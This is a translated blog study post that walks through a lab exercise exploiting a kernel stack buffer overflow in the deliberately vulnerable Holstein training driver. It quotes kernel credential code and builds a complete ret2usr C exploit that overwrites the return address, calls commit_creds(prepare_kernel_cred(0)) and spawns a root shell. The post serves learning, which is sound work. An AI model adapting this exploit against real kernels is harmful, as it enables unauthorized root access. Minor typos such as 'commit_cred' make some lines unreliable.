---
title: "[KERNEL] KBOF"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※ https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ Please let me know if there are any mistakes. We will check and correct it. ※ Holstein https://"
date: "2024-06-27"
translation_key: "tistory-9743f1296bfa"
tags: ["STUDY/KERNEL"]
category: "STUDY/KERNEL"
source_url: "https://whrdud727.tistory.com/entry/KERNEL-KBOF"
private: false
---

**※ If there are any mistakes, please let me know. We will check and correct it. **※**** 

[https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module](https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module)

 [\[KERNEL\] Holstein Module

※ If there are any mistakes, please let me know. We will check and correct it. ※ ​Holsteinhttps://whrdud727.tistory.com/entry/KERNEL-Environment-Setting ​\[KERNEL\] Environment Setting※ ​Please let me know if there are any mistakes.

whrdud727.tistory.com](https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module)

In the previous post, we used the Holstein module to analyze code and check vulnerabilities. 

We will try to exploit the fact that RIP can be manipulated through a vulnerability.

#### commit\_creds()

* * *

The cred structure contains permission information for the process. And this is managed in a structure called task\_cred.

```
int commit_creds(struct cred *new)
{
	struct task_struct *task = current;
	const struct cred *old = task->real_cred;

	kdebug("commit_creds(%p{%ld})", new,
	       atomic_long_read(&new->usage));

	BUG_ON(task->cred != old);
	BUG_ON(atomic_long_read(&new->usage) < 1);

	get_cred(new); /* we will require a ref for the subj creds too */

	/* dumpability changes */
	if (!uid_eq(old->euid, new->euid) ||
	    !gid_eq(old->egid, new->egid) ||
	    !uid_eq(old->fsuid, new->fsuid) ||
	    !gid_eq(old->fsgid, new->fsgid) ||
	    !cred_cap_issubset(old, new)) {
		if (task->mm)
			set_dumpable(task->mm, suid_dumpable);
		task->pdeath_signal = 0;
		/*
		 * If a task drops privileges and becomes nondumpable,
		 * the dumpability change must become visible before
		 * the credential change; otherwise, a __ptrace_may_access()
		 * racing with this change may be able to attach to a task it
		 * shouldn't be able to attach to (as if the task had dropped
		 * privileges without becoming nondumpable).
		 * Pairs with a read barrier in __ptrace_may_access().
		 */
		smp_wmb();
	}

	/* alter the thread keyring */
	if (!uid_eq(new->fsuid, old->fsuid))
		key_fsuid_changed(new);
	if (!gid_eq(new->fsgid, old->fsgid))
		key_fsgid_changed(new);

	/* do it
	 * RLIMIT_NPROC limits on user->processes have already been checked
	 * in set_user().
	 */
	if (new->user != old->user || new->user_ns != old->user_ns)
		inc_rlimit_ucounts(new->ucounts, UCOUNT_RLIMIT_NPROC, 1);
	rcu_assign_pointer(task->real_cred, new);
	rcu_assign_pointer(task->cred, new);
	if (new->user != old->user || new->user_ns != old->user_ns)
		dec_rlimit_ucounts(old->ucounts, UCOUNT_RLIMIT_NPROC, 1);
...
```

commit\_creds() receives the new cred structure as an argument. It then plays the role of setting each permission information of the process as information in the new cred structure.

#### init\_cred

* * *

```
struct cred init_cred = {
	.usage			= ATOMIC_INIT(4),
	.uid			= GLOBAL_ROOT_UID,
	.gid			= GLOBAL_ROOT_GID,
	.suid			= GLOBAL_ROOT_UID,
	.sgid			= GLOBAL_ROOT_GID,
	.euid			= GLOBAL_ROOT_UID,
	.egid			= GLOBAL_ROOT_GID,
	.fsuid			= GLOBAL_ROOT_UID,
	.fsgid			= GLOBAL_ROOT_GID,
	.securebits		= SECUREBITS_DEFAULT,
	.cap_inheritable	= CAP_EMPTY_SET,
	.cap_permitted		= CAP_FULL_SET,
	.cap_effective		= CAP_FULL_SET,
	.cap_bset		= CAP_FULL_SET,
	.user			= INIT_USER,
	.user_ns		= &init_user_ns,
	.group_info		= &init_groups,
	.ucounts		= &init_ucounts,
};
```

If you look at init\_cred in the cred structure, values including uid, gid, etc. indicate ROOT authority.

If you have confirmed up to this point, you can change the process's permission information to root by passing the init\_cred structure as an argument to commit\_creds().

#### prepare\_kernel\_cred

* * *

```
struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
	const struct cred *old;
	struct cred *new;

	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
	if (!new)
		return NULL;

	kdebug("prepare_kernel_cred() alloc %p", new);

	if (daemon)
		old = get_task_cred(daemon);
	else
		old = get_cred(&init_cred);

	validate_creds(old);
...
```

In versions prior to linux kernel 6.2, if the argument to prepare\_kernel\_cred() is NULL, the init\_cred structure is returned. 

In the previous post, we discussed modifying the RIP, but if we enter the code below into the RIP location, we will be elevated to the root user rather than a regular user.

```
commit_cred(prepare_kernel_cred(NULL))
```

#### ret2usr

* * *

What we have confirmed so far operates in the kernel area. If you succeed in overwriting with the desired value, you must return to the user area.

**swapgs**

Use the swapgs command of the Intel architecture.  When moving from kernel mode to user mode, GS Segment is set differently. Therefore, before returning from the kernel area to the user area, you must use the corresponding command to set the GS Segment.

**iretq**

This command is used when moving from kernel area to user area.

![](/assets/images/tistory/tistory-9743f1296bfa/001.png)

To summarize again, the code below is executed in the kernel area.

```
commit_cred(prepare_kernel_cred(NULL))
```

Afterwards, you must set the GS Segment with swapgs and then return to the user area with iretq.

This is a basic script for this.

```
static void win() {
 char *argv[] = { "/bin/sh", NULL };
 char *envp[] = { NULL };
 puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
 asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

static void restore_state() {
  asm volatile("swapgs ;"
               "movq %0, 0x20(%%rsp)\t\n"
               "movq %1, 0x18(%%rsp)\t\n"
               "movq %2, 0x10(%%rsp)\t\n"
               "movq %3, 0x08(%%rsp)\t\n"
               "movq %4, 0x00(%%rsp)\t\n"
               "iretq"
               :
               : "r"(user_ss),
 "r"(user_rsp),
 "r"(user_rflags),
 "r"(user_cs), "r"(win));
}
```

If you look at the code, you can see that there is win() for the shell.

Even if the privilege itself is elevated from a regular user to root, the shell does not immediately take notice. Since this literally means that the execution permission of the process has been changed to root, you need to set a function to run /bin/sh in the code for the shell.

#### Exploit

* * *

In order to exploit, the offset between buf and ret must be obtained, similar to BoF in the user area.

Use the ./root/vuln.ko file to find the offset of the vulnerable function \_copy\_from\_user.

.

![](/assets/images/tistory/tistory-9743f1296bfa/002.png)

I confirmed that the offset was 0x190.

Now let's connect to the kernel and find the base address. 

You can easily obtain the base address by entering the command below.

```
cat /proc/moduls
```

![](/assets/images/tistory/tistory-9743f1296bfa/003.png)

Run gdb and connect to the kernel as shown below.

```
target remote localhost:12345
```

![](/assets/images/tistory/tistory-9743f1296bfa/004.png)

\[ To connect, you must add gdb tcp settings to run.sh. - Covered in previous post.\]

[https://whrdud727.tistory.com/entry/KERNEL-Environment-Setting](https://whrdud727.tistory.com/entry/KERNEL-Environment-Setting) 

 [\[KERNEL\] Environment Setting

※ If there are any mistakes, please let me know. We will check and correct it. ※ https://lrl.kr/JT5m カーネルexploitへの導入 | PAWNYABLE! It's time to explode!

whrdud727.tistory.com](https://whrdud727.tistory.com/entry/KERNEL-Environment-Setting)

The kernel executes the binary that generates the previously created segment fault.

\[I modified the code from 0x500 to 0x400 and proceeded\]

![](/assets/images/tistory/tistory-9743f1296bfa/005.png)

Before calling \_copy\_from\_user()

![](/assets/images/tistory/tistory-9743f1296bfa/006.png)

After calling \_copy\_from\_user()

You can see that the values up to 0x10 after rbp and ret are covered.

The offset of buf - ret is 0x408.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags;
unsigned long prepare_kernel_cred = 0xffffffff8106e240;
unsigned long commit_creds = 0xffffffff8106e390;

static void win() {
        char *argv[] = { "/bin/sh", NULL };
        char *evnp[] = { NULL };
        puts("[+] win!");
        execve("/bin/sh", argv, evnp);
}

static void save_state() {
        asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "movq %%rsp, %2\n"
            "pushfq\n"
            "popq %3\n"
            : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags
)
	  :
      : "memory");
}

static void restore_state() {
  asm volatile("swapgs ;"
               "movq %0, 0x20(%%rsp)\t\n"
               "movq %1, 0x18(%%rsp)\t\n"
               "movq %2, 0x10(%%rsp)\t\n"
               "movq %3, 0x08(%%rsp)\t\n"
               "movq %4, 0x00(%%rsp)\t\n"
               "iretq"
               :
               : "r"(user_ss),
 "r"(user_rsp),
 "r"(user_rflags),
 "r"(user_cs), "r"(win));
}

static void escalate_privilege() {
        char* (*pkc)(int) = (void*)(prepare_kernel_cred);
        void (*cc)(char*) = (void*)(commit_creds);
        (*cc)((*pkc)(0));
        restore_state();
}

int main() {
    save_state();
    int fd = open("/dev/holstein", 2);

    char buf[0x410];
    memset(buf, 'A', 0x410);
    *(unsigned long*)&buf[0x408] = (unsigned long)&escalate_privilege;
    write(fd, buf, 0x410);

    close(fd);
    return 0;
}
```

This is the final exploit code that adds a value to the ret location in main() to enable privilege elevation.

To check the results, I will set the part that was set with root authority back to 1337 and proceed.

Just edit the ./root/etc/init.d file.

```
#!/bin/sh

##
## Setup
##
mdev -s
mount -t proc none /proc
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
stty -opost
#echo 2 > /proc/sys/kernel/kptr_restrict
#echo 1 > /proc/sys/kernel/dmesg_restrict

##
## Install driver
##
insmod /root/vuln.ko
mknod -m 666 /dev/holstein c `grep holstein /proc/devices | awk '{print $1;}'` 0

##
## User shell
##
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
echo "[ Holstein v1 (LK01) - Pawnyable ]"
setsid cttyhack setuidgid 1337 sh

##
## Cleanup
##
umount /proc
poweroff -d 0 -f
```

![](/assets/images/tistory/tistory-9743f1296bfa/007.png)

After successfully elevating privileges, you can see that a shell has been obtained.